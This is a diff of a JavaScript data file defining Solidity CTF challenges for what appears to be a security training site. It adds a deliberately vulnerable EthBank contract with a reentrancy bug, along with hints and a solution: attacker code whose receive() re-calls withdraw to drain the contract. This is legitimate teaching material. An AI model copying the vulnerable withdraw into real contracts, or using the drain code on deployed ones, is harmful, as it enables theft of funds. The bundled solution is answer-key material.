@@ -1,52 +1,49 @@
 export const CHALLENGE_DETAILS = {
   1: {
-    title: 'Vault Reentrancy',
-    tags: ['solidity', 'easy', 'security', 'ctf'],
-    points: 100,
-    scenario: 'Alice and Bob each has 1 ETH deposited into the vault contract.',
+    title: 'Re-Entrancy',
+    tags: ['solidity', 'hard', 'security', 'ctf'],
+    passed: 826,
+    points: 300,
+    scenario: 'Alice and Bob each has 1 ETH deposited into EthBank contract.',
     vulnerableCode: `// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
+pragma solidity 0.8.30;
 
-import {IChallenge} from "../interfaces/IChallenge.sol";
-
-contract Challenge1_Vault is IChallenge {
-    mapping(address => bool) public solved;
+contract EthBank {
     mapping(address => uint256) public balances;
 
     function deposit() external payable {
         balances[msg.sender] += msg.value;
     }
 
-    function withdraw(uint256 amount) external {
-        require(balances[msg.sender] >= amount, "Insufficient balance");
-
-        (bool success, ) = msg.sender.call{value: amount}("");
-        require(success, "Transfer failed");
-
-        balances[msg.sender] -= amount;
-
-        if (balances[msg.sender] == 0 && address(this).balance == 0) {
-            solved[msg.sender] = true;
-            emit ChallengeSolved(msg.sender, block.timestamp);
-        }
-    }
-
-    receive() external payable {
-        balances[msg.sender] += msg.value;
+    function withdraw() external payable {
+        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
+        require(sent, "failed to send ETH");
+        balances[msg.sender] = 0;
     }
 }`,
     tasks: [
       {
         id: 1,
-        description: 'Drain all ETH from the vault. You are given 1 ETH when the function attack is called.',
+        description: 'Drain all ETH from EthBank. You are given 1 ETH when the function pwn is called.',
         completed: false,
       },
     ],
     hints: [
-      'Inside attack, deposit and then withdraw 1 ETH.',
-      'receive will be called by the vault so call withdraw again.',
+      'Inside pwn, deposit and then withdraw 1 ETH.',
+      'receive will be called by EthBank so call withdraw again.',
       'Optionally send all ETH to attacker.',
     ],
+    solution: `receive() external payable {
+    if (address(bank).balance >= 1 ether) {
+        bank.withdraw();
+    }
+}
+
+function pwn() external payable {
+    bank.deposit{value: 1 ether}();
+    bank.withdraw();
+    payable(msg.sender).transfer(address(this).balance);
+}`,
   },
   2: {
     title: 'Access Control',
